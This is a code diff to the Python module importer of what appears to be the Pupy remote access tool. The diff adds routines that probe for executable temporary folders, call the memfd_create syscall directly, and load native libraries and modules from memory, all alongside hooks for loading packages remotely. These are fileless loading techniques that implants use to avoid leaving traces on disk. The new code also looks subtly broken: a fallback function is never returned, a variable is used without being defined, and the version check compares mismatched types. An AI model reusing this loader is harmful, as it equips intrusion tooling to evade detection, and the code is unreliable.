@@ -22,8 +22,14 @@ __debug = False
 __trace = False
 __dprint_method = None
 
-modules = {}
-dlls = set()
+if not hasattr(sys, '__pupyimporter_modules'):
+    setattr(sys, '__pupyimporter_modules', {})
+
+if not hasattr(sys, '__pupyimporter_dlls'):
+    setattr(sys, '__pupyimporter_dlls', set())
+
+from sys import __pupyimporter_modules as modules
+from sys import __pupyimporter_dlls as dlls
 
 def dprint(msg):
     global __debug
@@ -47,6 +53,153 @@ def loadpy(src, dst, masked=False):
 
     exec (marshal.loads(content), dst)
     del content
+
+def find_writable_folder():
+    import sys
+
+    dprint('Search writable folder')
+
+    if hasattr(sys, '__pupyimporter_writable_folder'):
+        return sys.__pupyimporter_writable_folder
+
+    from tempfile import mkstemp, gettempdir
+    from os import chmod, unlink, close, write, access, X_OK
+
+    temporary_folders = [gettempdir()]
+    if sys.platform != 'win32':
+        temporary_folders = [
+            '/dev/shm', '/tmp', '/var/tmp', '/run'
+        ] + temporary_folders
+
+    dprint('find_writable_folder: possible folders: {}'.format(
+        ':'.join(list(temporary_folders))))
+
+    for folder in temporary_folders:
+        fd, name = None, None
+        try:
+            fd, name = mkstemp(dir=folder)
+
+            if sys.platform != 'win32':
+                try:
+                    chmod(name, 0777)
+                    if not access(name, X_OK):
+                        dprint('find_writable_folder: Noexec location {}'.format(name))
+                        continue
+
+                except Exception, e:
+                    dprint('find_writable_folder: {}: {}'.format(name, e))
+                    continue
+
+        except Exception, e:
+            dprint('find_writable_folder: dir={}: {}'.format(folder, e))
+            continue
+
+        finally:
+            if fd is not None:
+                close(fd)
+
+            if name is not None:
+                try:
+                    unlink(name)
+                except:
+                    pass
+
+        setattr(sys, '__pupyimporter_writable_folder', folder)
+        return folder
+
+def get_tmpfile_function():
+    from tempfile import mkstemp
+    import sys
+    import platform
+
+    if sys.platform.startswith('linux'):
+        maj, min = platform.release().split('.')[:2]
+        if maj >= 3 and min >= 13:
+            __NR_memfd_create_syscall = {
+                'x86_64':   319,
+                '__i386__': 356,
+                'arm':      385,
+            }
+
+            machine = platform.machine()
+            if machine.startswith('arm'):
+                machine = 'arm'
+
+            __NR_memfd_create = __NR_memfd_create_syscall.get(machine)
+            if __NR_memfd_create:
+                import errno
+                import ctypes
+                from os import getpid, close
+
+                libc = ctypes.CDLL(None)
+                syscall = libc.syscall
+
+                def memfd_create(name=None):
+                    fd = syscall(__NR_memfd_create, name or 'heap', 0x1)
+                    if fd != -1:
+                        return fd, '/proc/{}/fd/{}'.format(getpid(), fd)
+
+                    err = ctypes.get_errno()
+                    raise OSError(err, errno.errorcode.get(err, 'Unknown error'))
+
+                try:
+                    fd, _ = memfd_create('probe')
+                    close(fd)
+                    return memfd_create
+                except:
+                    pass
+
+        folder = find_writable_folder()
+        if folder:
+            def mkstemp_create(name=None):
+                return mkstemp(prefix=name, dir=folder)
+
+def py_memimporter():
+    create_tmpfile = get_tmpfile_function()
+
+    if not create_tmpfile:
+        return None
+
+    from os import write, close, unlink
+
+    class MemImporter(object):
+        def __init__(self, create_tmpfile):
+            self._create_tmpfile = create_tmpfile
+
+        def import_module(self, data, initfuncname, fullname, path):
+            return self.load_library(
+                data, fullname, dlopen=False,
+                initfuncname=initfuncname)
+
+        def _load_library(self, data, initfuncname):
+            fd, name = self._create_tmpfile()
+            try:
+                write(fd, data)
+
+                result = None
+                if initfuncname:
+                    result = imp.load_dynamic(initfuncname[4:], name)
+                else:
+                    result = imp.load_dynamic(fullname, name)
+
+                return result
+
+            finally:
+                close(fd)
+
+                try:
+                    unlink(name)
+                except:
+                    pass
+
+        def load_library(self, data, fullname, dlopen=True, initfuncname=None):
+            if dlopen:
+                return ctypes.CDLL(fullname)
+            else:
+                return self._load_library(data, initfuncname)
+
+    return MemImporter(create_tmpfile)
+
 
 def memtrace(msg):
     global __debug
@@ -77,93 +230,10 @@ try:
 except ImportError:
     builtin_memimporter = False
     allow_system_packages = True
-    import ctypes
-    import platform
-    if sys.platform!="win32":
-        libc = ctypes.CDLL(None)
-        syscall = libc.syscall
-    from tempfile import mkstemp
-    from os import chmod, unlink, close, write
 
-    class MemImporter(object):
-        def __init__(self):
-            self.dir = None
-            self.memfd = None
-            self.ready = False
-
-            if platform.system() == 'Linux':
-                maj, min = platform.release().split('.')[:2]
-                if maj >= 3 and min >= 13:
-                    __NR_memfd_create = None
-                    machine = platform.machine()
-                    if machine == 'x86_64':
-                        __NR_memfd_create = 319
-                    elif machine == '__i386__':
-                        __NR_memfd_create = 356
-
-                    if __NR_memfd_create:
-                        self.memfd = lambda: syscall(__NR_memfd_create, 'heap', 0x1)
-                        self.ready = True
-                        return
-
-            for dir in ['/dev/shm', '/tmp', '/var/tmp', '/run']:
-                try:
-                    fd, name = mkstemp(dir=dir)
-                except:
-                    continue
-
-                try:
-                    chmod(name, 0777)
-                    self.dir = dir
-                    self.ready = True
-                    break
-
-                finally:
-                    close(fd)
-                    unlink(name)
-
-        def import_module(self, data, initfuncname, fullname, path):
-            return self.load_library(data, fullname, dlopen=False, initfuncname=initfuncname)
-
-
-        def load_library(self, data, fullname, dlopen=True, initfuncname=None):
-            fd = -1
-            closefd = True
-
-            result = False
-
-            if self.memfd:
-                fd = self.memfd()
-                if fd != -1:
-                    name = '/proc/self/fd/{}'.format(fd)
-                    closefd = False
-
-            if fd == -1:
-                fd, name = mkstemp(dir=self.dir)
-
-            try:
-                write(fd, data)
-                if dlopen:
-                    result = ctypes.CDLL(fullname)
-                else:
-                    if initfuncname:
-                        result = imp.load_dynamic(initfuncname[4:], name)
-                    else:
-                        result = imp.load_dynamic(fullname, name)
-
-            except Exception as e:
-                self.dir = None
-                raise e
-
-            finally:
-                if closefd:
-                    close(fd)
-                    unlink(name)
-
-            return result
-
-    _memimporter = MemImporter()
-    builtin_memimporter = _memimporter.ready
+if not builtin_memimporter:
+    _memimporter = py_memimporter()
+    builtin_memimporter = bool(_memimporter)
 
 remote_load_package = None
 remote_print_error = None
@@ -177,7 +247,6 @@ except ImportError:
 
 def get_module_files(fullname):
     """ return the file to load """
-    global modules
     path = fullname.replace('.','/')
 
     files = [
@@ -200,8 +269,6 @@ def pupy_add_package(pkdic, compressed=False, name=None):
     import cPickle
     import zlib
 
-    global modules
-
     if compressed:
         pkdic = zlib.decompress(pkdic)
 
@@ -222,8 +289,6 @@ def pupy_add_package(pkdic, compressed=False, name=None):
     memtrace(name)
 
 def has_module(name):
-    global modules
-
     if name in sys.modules or name in modules:
         return True
 
@@ -242,7 +307,6 @@ def has_module(name):
     return False
 
 def has_dll(name):
-    global dlls
     return name in dlls
 
 def new_modules(names):
@@ -256,7 +320,6 @@ def new_dlls(names):
     ]
 
 def load_dll(name, buf):
-    global dlls
     if name in dlls:
         return True
 
@@ -271,7 +334,6 @@ def load_dll(name, buf):
 def invalidate_module(name):
     import pupy
 
-    global modules
     global __debug
 
     for item in modules.keys():
@@ -411,7 +473,6 @@ class PupyPackageFinder(object):
         if fullname.startswith('exposed_'):
             return None
 
-        global modules
         global remote_load_package
 
         dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))
@@ -589,7 +650,6 @@ def install(debug=None, trace=False):
     global __debug
     global __trace
     global __dprint_method
-    global modules
 
     if debug:
        __debug = True
